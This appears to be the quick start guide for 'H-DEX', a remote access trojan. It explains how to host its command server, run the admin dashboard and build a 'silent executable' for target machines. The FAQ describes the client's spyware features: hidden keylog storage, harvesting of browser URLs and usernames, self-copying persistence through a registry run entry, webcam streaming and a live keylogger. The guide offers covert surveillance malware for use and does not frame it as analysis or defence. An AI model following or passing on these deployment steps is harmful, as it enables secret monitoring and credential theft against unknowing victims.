Quick Start Guide

Deploy Server

Host on Railway.app or run locally with Python

2

Launch Dashboard

Run admin_dashboard.py and connect

Build Client

Use the Builder tab to create .exe

H-DEX operates on a simple three-part architecture:

  • Server: A central hub (that you host) that connects the Dashboard and Clients.
  • Dashboard: The powerful control panel (admin_dashboard.py) you use to manage devices.
  • Client: A silent executable you build and deploy on target machines.

Step 1: Server Setup

Option A: Deploy on Railway (Recommended)

  1. Sign up on Railway.app.
  2. Create a new project and upload the H-dex Server directory.
  3. Railway auto-detects the Procfile and starts Python.
  4. Get your public URL: wss://your-project.up.railway.app

Option B: Host Locally

pip install -r requirements.txt python server.py

Local URI: ws://127.0.0.1:8765

Step 2: Launch Dashboard

pip install -r requirements.txt python admin_dashboard.py

Click "Change Server" and enter your Server URI if the status shows "Offline".

Step 3: Build Client

  1. Go to the Builder tab in the dashboard.
  2. Enter your Server URI (e.g., wss://your-server.up.railway.app)
  3. Optionally add a Client Tag and custom Icon.
  4. Click Build .exe - find output in dist/ folder.

FAQ

How do keylogs persist across reboots?
Keylogs are stored in a hidden file in the user's AppData folder. They persist even after the client restarts and can be retrieved anytime via the "Load All History" button.
Can I use cloud hosting for free?
Yes! Railway.app offers a free tier that's sufficient for testing. For production use, you may need a paid plan for better uptime and resources.
Why aren't browser passwords decrypted?
Chrome passwords are encrypted with Windows DPAPI. Full decryption requires additional code and elevated privileges. The current implementation shows URLs and usernames.
Does the client add itself to startup?
Yes, by default the client copies itself to AppData and adds a registry entry for persistence. This ensures reconnection after system reboots.

Troubleshooting

  • Client not connecting? Double-check the Server URI format (ws:// or wss://). Check firewall rules.
  • Build failing? Ensure pyinstaller is installed. Check the build log for errors.
  • Webcam not streaming? The client may lack permissions or hardware.
  • Live keylogger not showing keys? Make sure to click "Start Live" and ensure the keylogger is running.
